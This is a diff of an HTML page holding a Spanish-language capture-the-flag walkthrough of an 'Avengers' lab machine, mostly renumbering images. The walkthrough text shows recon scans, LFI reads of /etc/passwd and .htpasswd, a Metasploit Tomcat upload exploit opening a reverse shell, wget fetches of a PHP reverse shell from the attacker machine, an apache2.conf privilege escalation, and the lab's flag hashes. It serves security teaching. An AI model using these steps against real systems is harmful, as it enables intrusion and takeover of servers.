@@ -469,6 +469,7 @@
       <div class="table-wrap">
         <table>
           <tbody>
+		  <tr><td><img src="imagenes/avengers5.png" alt="Imagen Hulk" /></td></tr>
             <tr><td><strong>HULK ARMOUR</strong></td><td>7BDA7019C06B53AEFC8EE95D2CDACCAA</td></tr>
             <tr><td><strong>HINT 1</strong></td><td>TheOlympics</td></tr>
           </tbody>
@@ -483,7 +484,7 @@
         <span class="prompt">Joseltc@kali:~$</span> gobuster dir -u http://192.168.56.128 -w /usr/share/wordlists/dirb/common.txt
       </div>
       <figure>
-        <img src="imagenes/avengers5.png" alt="Resultado de gobuster" />
+        <img src="imagenes/avengers6.png" alt="Resultado de gobuster" />
         <figcaption>Directorio descubiertos con gobuster</figcaption>
       </figure>
       <p>Con este comando conseguimos la estructura de directorios del servidor web pero tampoco vemos nada que nos llame la atención.</p>
@@ -492,12 +493,12 @@
         <span class="prompt">Joseltc@kali:~$</span> nikto -h 192.168.56.128
       </div>
       <figure>
-        <img src="imagenes/avengers6.png" alt="Resultado de nikto" />
+        <img src="imagenes/avengers7.png" alt="Resultado de nikto" />
         <figcaption>Resultado de nikto</figcaption>
       </figure>
       <p>Seguimos obteniendo los mismos resultados. Vamos a comprobar el código index.html por si nos hubieran dejado alguna pista oculta en su interior.</p>
       <figure>
-        <img src="imagenes/avengers7.png" alt="Código fuente de index.html" />
+        <img src="imagenes/avengers8.png" alt="Código fuente de index.html" />
         <figcaption>Código fuente de index.html</figcaption>
       </figure>
       <p>En el código podemos encontrar estas 3 pequeñas pistas que podrían ser un usuario, un puerto y un archivo a descargar.</p>
@@ -507,7 +508,7 @@
         <span class="prompt">Joseltc@kali:~$</span> nmap -sU -p69 192.168.56.128
       </div>
       <figure>
-        <img src="imagenes/avengers8.png" alt="Escaneo UDP puerto 69" />
+        <img src="imagenes/avengers9.png" alt="Escaneo UDP puerto 69" />
         <figcaption>Escaneo UDP puerto 69</figcaption>
       </figure>
       <p>Como vemos hay un servicio tftp en el puerto 69. Lo más probable es que el archivo notes.txt se encuentre en este servidor. Vamos a probar suerte.</p>
@@ -518,18 +519,19 @@
         <span class="prompt">tftp&gt;</span> get notes.txt
       </div>
       <figure>
-        <img src="imagenes/avengers9.png" alt="Descarga de notes.txt" />
+        <img src="imagenes/avengers10.png" alt="Descarga de notes.txt" />
         <figcaption>Descarga de notes.txt</figcaption>
       </figure>
       <p>Hemos obtenido el archivo del servidor tftp con el comando <strong>get notes.txt</strong> y en el archivo podemos ver que está la segunda armadura, esta vez es la de Spiderman, y la segunda parte de la contraseña.</p>
       <figure>
-        <img src="imagenes/avengers10.png" alt="Contenido de notes.txt" />
+        <img src="imagenes/avengers11.png" alt="Contenido de notes.txt" />
         <figcaption>Contenido de notes.txt</figcaption>
       </figure>
 
       <div class="table-wrap">
         <table>
           <tbody>
+		    <tr><td><img src="imagenes/avengers12.png" alt="Spiderman" /></td></tr>
             <tr><td><strong>Spiderman Armour</strong></td><td>83A75F0B31435193BAFD3B9C5FD45AEC</td></tr>
             <tr><td><strong>Hint 2</strong></td><td>maybeevena</td></tr>
           </tbody>
@@ -538,19 +540,19 @@
 
       <p>Como en ninguna de las pistas hemos encontrado algún camino que seguir, vamos a utilizar la herramienta <strong>dirbuster</strong> con el objetivo de intentar profundizar más dentro del servidor apache.</p>
       <figure>
-        <img src="imagenes/avengers11.png" alt="Configuración de dirbuster" />
+        <img src="imagenes/avengers13.png" alt="Configuración de dirbuster" />
         <figcaption>Configuración de dirbuster</figcaption>
       </figure>
       <p>Después de un buen rato de búsqueda, hemos encontrado un archivo php que puede ser interesante para la explotación de LFI.</p>
       <figure>
-        <img src="imagenes/avengers12.png" alt="Resultado de dirbuster" />
+        <img src="imagenes/avengers14.png" alt="Resultado de dirbuster" />
         <figcaption>Resultado de dirbuster</figcaption>
       </figure>
       <p>LFI (Local File Inclusion) es una vulnerabilidad de seguridad web que permite a un atacante incluir y ejecutar archivos locales del servidor a través de una aplicación web. Ocurre cuando una aplicación permite que el usuario especifique la ruta de un archivo sin validar adecuadamente la entrada, lo que permite al atacante manipular el parámetro para acceder a archivos sensibles del sistema.</p>
       <p>Al abrir el archivo en el navegador podemos ver que está vacío.</p>
       <p>Con la búsqueda <strong>http://192.168.56.128/file.php?file=/etc/passwd</strong> vamos a comprobar si realmente la máquina es vulnerable a este ataque. (Si nos muestra el archivo podemos determinar que sí es vulnerable).</p>
       <figure>
-        <img src="imagenes/avengers13.png" alt="Comprobación de LFI" />
+        <img src="imagenes/avengers15.png" alt="Comprobación de LFI" />
         <figcaption>Comprobación de LFI</figcaption>
       </figure>
       <p>Ahora que ya sabemos que es vulnerable, vamos a comprobar los principales archivos del sistema y de los servicios que se encuentran instalados en la máquina vulnerable.</p>
@@ -572,7 +574,7 @@
       <p>En estos archivos encontramos lo siguiente:</p>
       <p>En /etc/passwd encontramos dos usuarios de la máquina vulnerable:</p>
       <figure>
-        <img src="imagenes/avengers14.png" alt="Contenido de /etc/passwd" />
+        <img src="imagenes/avengers16.png" alt="Contenido de /etc/passwd" />
         <figcaption>Contenido de /etc/passwd</figcaption>
       </figure>
       <ul>
@@ -594,13 +596,14 @@
       </div>
       <p>En el archivo /etc/apache2/.htpasswd encontramos la tercera armadura que buscábamos y la tercera y última parte de la contraseña.</p>
       <figure>
-        <img src="imagenes/avengers15.png" alt="Contenido de .htpasswd" />
+        <img src="imagenes/avengers17.png" alt="Contenido de .htpasswd" />
         <figcaption>Contenido de .htpasswd</figcaption>
       </figure>
 
       <div class="table-wrap">
         <table>
           <tbody>
+		  <tr><td><img src="imagenes/avengers18.png" alt="Antman" /><td><tr>
             <tr><td><strong>Antman Armour</strong></td><td>A9F56B7ECE2113C9C4A1214A19EDE99C</td></tr>
             <tr><td><strong>Hint 3</strong></td><td>StarBucks</td></tr>
           </tbody>
@@ -646,12 +649,12 @@
       <p>En el archivo /etc/ssh/sshd_config encontramos alguna cosa interesante, que aunque ya la hemos conseguido por otros medios con anterioridad, también podríamos haber llegado a ella desde aquí.</p>
       <p>El fichero de configuración indica que el banner no será el que tiene SSH por defecto, si no que será Banner /etc/ssh/sshd_banner.</p>
       <figure>
-        <img src="imagenes/avengers16.png" alt="Contenido de sshd_config" />
+        <img src="imagenes/avengers19.png" alt="Contenido de sshd_config" />
         <figcaption>Contenido de sshd_config</figcaption>
       </figure>
       <p>Si accedemos al documento a través de la web, vemos que nos volvemos a encontrar con la armadura de HULK y la HINT 1 que nos encontrábamos al iniciar el servicio SSH. Este fichero es su origen.</p>
       <figure>
-        <img src="imagenes/avengers17.png" alt="Contenido de sshd_banner" />
+        <img src="imagenes/avengers20.png" alt="Contenido de sshd_banner" />
         <figcaption>Contenido de sshd_banner</figcaption>
       </figure>
 
@@ -674,7 +677,7 @@
       <p>Para buscar vulnerabilidades de una aplicación, lo más sencillo es usar metasploit.</p>
       <p>Con los comandos <strong>msfdb init &amp; msfconsole</strong> iniciamos la base de datos de metasploit y la consola.</p>
       <figure>
-        <img src="imagenes/avengers18.png" alt="Inicio de Metasploit" />
+        <img src="imagenes/avengers21.png" alt="Inicio de Metasploit" />
         <figcaption>Inicio de Metasploit</figcaption>
       </figure>
       <p>Con <strong>search tomcat</strong> encontramos más de 70 vulnerabilidades distintas en la máquina. Para realizar una búsqueda más eficiente y mas certera, vamos a utilizar el comando <strong>search type:exploit tomcat authenticated</strong> y de esta manera solo obtendremos las vulnerabilidades relacionadas con el inicio de sesión en tomcat.</p>
@@ -682,14 +685,14 @@
         <span class="prompt">msf6 &gt;</span> search type:exploit tomcat authenticated
       </div>
       <figure>
-        <img src="imagenes/avengers19.png" alt="Búsqueda de exploits de Tomcat" />
+        <img src="imagenes/avengers22.png" alt="Búsqueda de exploits de Tomcat" />
         <figcaption>Búsqueda de exploits de Tomcat</figcaption>
       </figure>
       <p>Investigando un poco, la vulnerabilidad tomcat_mgr_upload es la recomendada para explotar porque es más moderna que la vulnerabilidad tomcat_mgr_deploy.</p>
       <p>Con <strong>use exploit/multi/http/tomcat_mgr_upload</strong> iniciamos el uso del exploit y nos indica que el payload para realizar la Shell inversa no está configurado.</p>
       <p>Con <strong>show options</strong> vemos las opciones que tiene esta vulnerabilidad y que serán las que debemos configurar con los datos que tenemos.</p>
       <figure>
-        <img src="imagenes/avengers20.png" alt="Opciones del exploit" />
+        <img src="imagenes/avengers23.png" alt="Opciones del exploit" />
         <figcaption>Opciones del exploit</figcaption>
       </figure>
       <p>Configuramos el exploit con los siguientes datos:</p>
@@ -701,28 +704,28 @@
         <li>set LHOST 192.168.56.129 (IP de la máquina Kali)</li>
       </ul>
       <figure>
-        <img src="imagenes/avengers21.png" alt="Configuración del exploit" />
+        <img src="imagenes/avengers24.png" alt="Configuración del exploit" />
         <figcaption>Configuración del exploit</figcaption>
       </figure>
       <p>Ahora ya podemos ejecutar el exploit con <strong>run</strong> o <strong>exploit</strong>, pero al hacer esta ejecución nos indica que debemos ajustar esta configuración para que se inicie correctamente -&gt; <strong>set FingerprintCheck false</strong></p>
       <p>Ahora al ejecutar run, ya nos indica que la sesión meterpreter ha sido abierta correctamente.</p>
       <figure>
-        <img src="imagenes/avengers22.png" alt="Sesión meterpreter abierta" />
+        <img src="imagenes/avengers25.png" alt="Sesión meterpreter abierta" />
         <figcaption>Sesión meterpreter abierta</figcaption>
       </figure>
       <p>Crearemos una shell y la haremos interactiva con <strong>python3 -c 'import pty; pty.spawn("/bin/bash")'</strong>. Ahora ya utilizaremos comandos propios de linux para intentar buscar alguna pista.</p>
       <figure>
-        <img src="imagenes/avengers23.png" alt="Shell interactiva" />
+        <img src="imagenes/avengers26.png" alt="Shell interactiva" />
         <figcaption>Shell interactiva</figcaption>
       </figure>
       <p>Vamos a explorar los directorios /home de los usuarios del sistema. Como podemos ver en la imagen no encontramos nada destacable.</p>
       <figure>
-        <img src="imagenes/avengers24.png" alt="Explorando /home" />
+        <img src="imagenes/avengers27.png" alt="Explorando /home" />
         <figcaption>Explorando /home</figcaption>
       </figure>
       <p>Revisando alguna carpeta más como tftpboot vemos el origen de la armadura de Spiderman y la pista número 2, pero esto ya lo habíamos conseguido.</p>
       <figure>
-        <img src="imagenes/avengers25.png" alt="Contenido de tftpboot" />
+        <img src="imagenes/avengers28.png" alt="Contenido de tftpboot" />
         <figcaption>Contenido de tftpboot</figcaption>
       </figure>
       <p>No tenemos acceso a la carpeta de root (como es normal) y navegando por el resto de directorios del sistema no encontramos nada destacable.</p>
@@ -732,7 +735,7 @@
         <span class="prompt">$</span> netstat -antp
       </div>
       <figure>
-        <img src="imagenes/avengers26.png" alt="Conexiones activas" />
+        <img src="imagenes/avengers29.png" alt="Conexiones activas" />
         <figcaption>Conexiones activas</figcaption>
       </figure>
       <p>Para poder acceder a ese puerto debemos hacer port-forwarding (Port Forwarding es una técnica que permite redirigir el tráfico de un puerto en tu máquina local a un puerto en una máquina remota, o viceversa) con <strong>portfwd add -L 0.0.0.0 -l 8081 -p 8081 -r 127.0.0.1</strong>. (<strong>Importante</strong>: es un comando que no deja ejecutarlo dentro de la sesión interactiva, por tanto, debemos hacer un <strong>exit</strong> y ejecutarlo en la Shell normal de meterpreter)</p>
@@ -740,18 +743,19 @@
         <span class="prompt">meterpreter &gt;</span> portfwd add -L 0.0.0.0 -l 8081 -p 8081 -r 127.0.0.1
       </div>
       <figure>
-        <img src="imagenes/avengers27.png" alt="Port forwarding" />
+        <img src="imagenes/avengers30.png" alt="Port forwarding" />
         <figcaption>Port forwarding</figcaption>
       </figure>
       <p>Y al acceder desde el navegador web, podemos ver la cuarta armadura, que corresponde a Black Panther.</p>
       <figure>
-        <img src="imagenes/avengers28.png" alt="Black Panther Armour" />
+        <img src="imagenes/avengers31.png" alt="Black Panther Armour" />
         <figcaption>Black Panther Armour</figcaption>
       </figure>
 
       <div class="table-wrap">
         <table>
           <tbody>
+		  <tr><td><img src="imagenes/avengers32.png" alt="Black Panther" /></td></tr>
             <tr><td><strong>Black Panther Armour</strong></td><td>690B4BAC6CA9FB81814128A294470F92</td></tr>
           </tbody>
         </table>
@@ -766,7 +770,7 @@
         <span class="prompt">$</span> ps aux | grep root
       </div>
       <figure>
-        <img src="imagenes/avengers29.png" alt="Procesos ejecutándose como root" />
+        <img src="imagenes/avengers33.png" alt="Procesos ejecutándose como root" />
         <figcaption>Procesos ejecutándose como root</figcaption>
       </figure>
       <p>Vemos que el archivo apache2.conf tiene todos los permisos activos, eso significa que <strong>cualquier usuario puede leer, escribir y ejecutar.</strong></p>
@@ -774,7 +778,7 @@
         <span class="prompt">$</span> ls -la /etc/apache2/apache2.conf
       </div>
       <figure>
-        <img src="imagenes/avengers30.png" alt="Permisos de apache2.conf" />
+        <img src="imagenes/avengers34.png" alt="Permisos de apache2.conf" />
         <figcaption>Permisos de apache2.conf</figcaption>
       </figure>
       <p>Aprovechando el LFI descargamos el archivo de configuración de apache en nuestra máquina local linux para modificarlo.</p>
@@ -783,14 +787,14 @@
         <span class="prompt">Joseltc@kali:~$</span> wget http://192.168.56.128/file.php?file=/etc/apache2/apache2.conf -O apache2.conf
       </div>
       <figure>
-        <img src="imagenes/avengers31.png" alt="Descarga de apache2.conf" />
+        <img src="imagenes/avengers35.png" alt="Descarga de apache2.conf" />
         <figcaption>Descarga de apache2.conf</figcaption>
       </figure>
       <p>Como anteriormente descubrimos al usuario aarti, tanto a través de LFI, como una vez ya dentro del sistema a través de meterpreter, ajustaremos el usuario y el grupo en el archivo de configuración de apache con aarti, tanto en usuario como en grupo.</p>
       <figure>
-        <img src="imagenes/avengers32.png" alt="Usuario aarti" />
+        <img src="imagenes/avengers36.png" alt="Usuario aarti" />
         <figcaption>Usuario aarti</figcaption>
-        <img src="imagenes/avengers33.png" alt="Modificación de apache2.conf" />
+        <img src="imagenes/avengers37.png" alt="Modificación de apache2.conf" />
         <figcaption>Modificación de apache2.conf</figcaption>
       </figure>
       <p>Para poder enviar este archivo desde nuestra máquina local a nuestra máquina vulnerable debemos abrir un servidor</p>
@@ -798,29 +802,29 @@
         <span class="prompt">Joseltc@kali:~$</span> python3 -m http.server 8000
       </div>
       <figure>
-        <img src="imagenes/avengers34.png" alt="Servidor Python" />
+        <img src="imagenes/avengers38.png" alt="Servidor Python" />
         <figcaption>Servidor Python</figcaption>
       </figure>
       <p>Por otra parte, desde la sesión meterpreter abierta ejecutaremos <strong>wget http://192.168.56.129:8000/apache2.conf -O apache2.conf</strong> para subir el archivo a la máquina y <strong>grep -E "^User|^Group" /etc/apache2/apache2.conf</strong> para comprobar que el archivo ha sido actualizado correctamente.</p>
       <figure>
-        <img src="imagenes/avengers35.png" alt="Subida del archivo y comprobación" />
+        <img src="imagenes/avengers39.png" alt="Subida del archivo y comprobación" />
         <figcaption>Subida del archivo y comprobación</figcaption>
       </figure>
       <p>Ahora debemos crear el archivo con la Shell reversa. Como en otras ocasiones utilizaremos el código del siguiente enlace: <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
       <p>Debemos modificar la ip con la dirección de Kali y el puerto que deseamos para realizar la Shell reversa.</p>
       <figure>
-        <img src="imagenes/avengers36.png" alt="Código de shell reversa" />
+        <img src="imagenes/avengers40.png" alt="Código de shell reversa" />
         <figcaption>Código de shell reversa</figcaption>
       </figure>
       <p>Volvemos a abrir el servidor Python para subir el archivo a la máquina vulnerable con <strong>python3 -m http.server 8000</strong> y desde la sesión meterpreter descargamos el archivo con <strong>wget http://192.168.56.129:8000/shell.php</strong></p>
       <figure>
-        <img src="imagenes/avengers37.png" alt="Subida de shell.php" />
+        <img src="imagenes/avengers41.png" alt="Subida de shell.php" />
         <figcaption>Subida de shell.php</figcaption>
       </figure>
       <p>Ahora debemos reiniciar apache. Como por comando no nos va a dejar, lo más práctico es reiniciar la máquina virtual.</p>
       <p>El archivo shell.php se subió correctamente</p>
       <figure>
-        <img src="imagenes/avengers38.png" alt="Verificación de shell.php" />
+        <img src="imagenes/avengers42.png" alt="Verificación de shell.php" />
         <figcaption>Verificación de shell.php</figcaption>
       </figure>
       <p>Después de varios intentos fallidos de ejecución del archivo desde el navegador, me percaté que no contaba con todos los permisos necesarios para funcionar de la manera correcta. Para ello le di todos los permisos con <strong>chmod 777 shell.php</strong></p>
@@ -828,12 +832,12 @@
         <span class="prompt">$</span> chmod 777 shell.php
       </div>
       <figure>
-        <img src="imagenes/avengers39.png" alt="Cambio de permisos" />
+        <img src="imagenes/avengers43.png" alt="Cambio de permisos" />
         <figcaption>Cambio de permisos</figcaption>
       </figure>
       <p>Ahora ya podemos ejecutar el archivo desde el navegador. Veremos que se queda en una carga constante.</p>
       <figure>
-        <img src="imagenes/avengers40.png" alt="Ejecución de shell.php" />
+        <img src="imagenes/avengers44.png" alt="Ejecución de shell.php" />
         <figcaption>Ejecución de shell.php</figcaption>
       </figure>
       <p>Desde Kali con <strong>nc -lvp 4444</strong> nos pondremos a escuchar</p>
@@ -841,23 +845,24 @@
         <span class="prompt">Joseltc@kali:~$</span> nc -lvp 4444
       </div>
       <figure>
-        <img src="imagenes/avengers41.png" alt="Listener netcat" />
+        <img src="imagenes/avengers45.png" alt="Listener netcat" />
         <figcaption>Listener netcat</figcaption>
       </figure>
       <p>Una vez que somos root buscamos la flag final que nos falta para terminar con el CTF.</p>
       <figure>
-        <img src="imagenes/avengers42.png" alt="Búsqueda de la flag final" />
+        <img src="imagenes/avengers46.png" alt="Búsqueda de la flag final" />
         <figcaption>Búsqueda de la flag final</figcaption>
       </figure>
       <p>Como podemos ver el archivo final.txt contiene la última armadura que estábamos buscando.</p>
       <figure>
-        <img src="imagenes/avengers43.png" alt="Ironman Armour" />
+        <img src="imagenes/avengers47.png" alt="Ironman Armour" />
         <figcaption>Ironman Armour</figcaption>
       </figure>
 
       <div class="table-wrap">
         <table>
           <tbody>
+		  <tr><td><img src="imagenes/avengers48.png" alt="Ironman" /></td></tr>
             <tr><td><strong>Ironman Armour</strong></td><td>3AE9D8799D1BB5E201E5704293BB54EF</td></tr>
           </tbody>
         </table>
